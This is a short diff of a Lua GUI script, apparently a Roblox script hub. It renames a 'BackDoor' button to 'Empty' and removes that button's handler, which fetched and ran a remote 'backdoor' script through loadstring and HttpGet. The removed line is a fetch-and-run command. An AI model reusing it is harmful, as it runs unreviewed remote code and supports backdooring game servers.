@@ -2289,16 +2289,16 @@ button.Parent = acg
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "BackDoor"
+button.Name = "Empty"
 button.Position = UDim2.new(0.5,0,0,198)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "BackDoor"
+button.Text = "Empty"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
+	
 end)
 local label = Instance.new("TextLabel")
 label.Parent = gt
